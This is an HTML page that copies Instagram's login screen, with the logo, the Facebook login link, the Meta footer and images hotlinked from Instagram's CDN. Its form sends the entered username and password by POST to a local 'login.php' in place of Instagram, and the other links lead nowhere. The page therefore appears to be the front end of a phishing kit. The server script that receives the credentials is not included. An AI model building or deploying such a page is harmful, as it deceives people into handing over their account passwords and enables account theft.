<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #262626;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex: 1;
            padding: 20px;
        }
        
        .login-box {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            width: 100%;
            max-width: 350px;
            margin-bottom: 10px;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
            margin-top: 10px;
        }
        
        .instagram-logo {
            width: 175px;
            height: auto;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 6px;
        }
        
        .input-field {
            width: 100%;
            padding: 9px 8px 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            line-height: 18px;
            color: #262626;
            outline: none;
        }
        
        .input-field:focus {
            border-color: #a8a8a8;
        }
        
        .input-label {
            position: absolute;
            left: 9px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 12px;
            color: #8e8e8e;
            pointer-events: none;
            transition: all 0.1s ease;
        }
        
        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label {
            top: 6px;
            transform: translateY(0);
            font-size: 10px;
        }
        
        .login-button {
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #ffffff;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 16px;
            margin-top: 12px;
            cursor: pointer;
            opacity: 0.7;
            pointer-events: none;
        }
        
        .login-button.active {
            opacity: 1;
            pointer-events: auto;
        }
        
        .login-button:hover.active {
            background: #1877f2;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .divider-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }
        
        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 20px;
        }
        
        .facebook-login:hover {
            color: #385185;
        }
        
        .facebook-icon {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }
        
        .forgot-password {
            text-align: center;
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .signup-box {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            width: 100%;
            max-width: 350px;
            text-align: center;
        }
        
        .signup-text {
            font-size: 14px;
            color: #262626;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .signup-link:hover {
            color: #00376b;
        }
        
        .get-app {
            text-align: center;
            margin-top: 20px;
        }
        
        .get-app-text {
            font-size: 14px;
            color: #262626;
            margin-bottom: 20px;
        }
        
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        
        .app-button {
            height: 40px;
        }
        
        .footer {
            padding: 40px 20px;
            text-align: center;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 20px;
        }
        
        .footer-link {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }
        
        .footer-link:hover {
            text-decoration: underline;
        }
        
        .footer-bottom {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            color: #8e8e8e;
            font-size: 12px;
        }
        
        .language-select {
            border: none;
            background: transparent;
            color: #8e8e8e;
            font-size: 12px;
            cursor: pointer;
        }
        
        @media (max-width: 450px) {
            .login-box, .signup-box {
                border: none;
                background: transparent;
            }
            
            .main-container {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="login-box">
            <div class="logo-container">
                <svg class="instagram-logo" viewBox="0 0 175 50" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <linearGradient id="ig-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" style="stop-color:#f09433"/>
                            <stop offset="25%" style="stop-color:#e6683c"/>
                            <stop offset="50%" style="stop-color:#dc2743"/>
                            <stop offset="75%" style="stop-color:#cc2366"/>
                            <stop offset="100%" style="stop-color:#bc1888"/>
                        </linearGradient>
                    </defs>
                    <text x="0" y="38" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="32" font-weight="600" fill="url(#ig-gradient)">Instagram</text>
                </svg>
            </div>
            
            <form class="login-form" action="login.php" method="POST">
                <div class="input-group">
                    <input type="text" id="username" name="username" class="input-field" placeholder=" " required>
                    <label for="username" class="input-label">Phone number, username, or email</label>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" name="password" class="input-field" placeholder=" " required>
                    <label for="password" class="input-label">Password</label>
                </div>
                
                <button type="submit" class="login-button" id="loginBtn">Log in</button>
            </form>
            
            <div class="divider">
                <div class="divider-line"></div>
                <span class="divider-text">OR</span>
                <div class="divider-line"></div>
            </div>
            
            <a href="#" class="facebook-login">
                <svg class="facebook-icon" viewBox="0 0 24 24" fill="#385185">
                    <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
                </svg>
                Log in with Facebook
            </a>
            
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            <span class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></span>
        </div>
        
        <div class="get-app">
            <p class="get-app-text">Get the app.</p>
            <div class="app-buttons">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020cHj0Q.png" alt="App Store" class="app-button">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Kgz.png" alt="Google Play" class="app-button">
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">Meta</a>
            <a href="#" class="footer-link">About</a>
            <a href="#" class="footer-link">Blog</a>
            <a href="#" class="footer-link">Jobs</a>
            <a href="#" class="footer-link">Help</a>
            <a href="#" class="footer-link">API</a>
            <a href="#" class="footer-link">Privacy</a>
            <a href="#" class="footer-link">Terms</a>
            <a href="#" class="footer-link">Locations</a>
            <a href="#" class="footer-link">Instagram Lite</a>
            <a href="#" class="footer-link">Threads</a>
            <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
            <a href="#" class="footer-link">Meta Verified</a>
        </div>
        <div class="footer-bottom">
            <select class="language-select">
                <option>English</option>
                <option>Español</option>
                <option>Français</option>
                <option>Deutsch</option>
                <option>Italiano</option>
            </select>
            <span>© 2024 Instagram from Meta</span>
        </div>
    </footer>
    
    <script>
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        
        function checkInputs() {
            if (usernameInput.value.trim() && passwordInput.value.trim()) {
                loginBtn.classList.add('active');
            } else {
                loginBtn.classList.remove('active');
            }
        }
        
        usernameInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);
    </script>
</body>
</html>
